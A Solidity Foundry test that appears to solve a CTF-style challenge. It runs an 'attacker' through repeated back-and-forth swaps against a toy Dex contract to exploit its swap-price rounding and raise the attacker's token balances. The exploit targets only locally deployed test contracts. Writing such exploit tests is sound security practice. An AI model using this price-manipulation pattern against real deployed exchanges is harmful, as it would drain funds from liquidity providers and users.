// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }

    function testArbitrageExploit() public {
        vm.startPrank(attacker);

        IERC20 tokenA = IERC20(address(swappabletokenA));
        IERC20 tokenB = IERC20(address(swappabletokenB));
        
        tokenA.approve(address(dex), type(uint256).max);
        tokenB.approve(address(dex), type(uint256).max);

        console.log("[Before Attack] TokenA Balance: %s, TokenB Balance: %s", tokenA.balanceOf(attacker), tokenB.balanceOf(attacker));

        for (uint256 i = 0; i < 5; i++) {
            uint256 amountOutB = dex.getSwapPrice(address(tokenA), address(tokenB), 10);
            dex.swap(address(tokenA), address(tokenB), 10);
            console.log("Swapped 10 TokenA -> %s TokenB", amountOutB);

            uint256 amountOutA = dex.getSwapPrice(address(tokenB), address(tokenA), amountOutB);
            dex.swap(address(tokenB), address(tokenA), amountOutB);
            console.log("Swapped %s TokenB -> %s TokenA", amountOutB, amountOutA);
        }

        console.log("[After Attack] TokenA Balance: %s, TokenB Balance: %s", tokenA.balanceOf(attacker), tokenB.balanceOf(attacker));
        vm.stopPrank();
    }
}
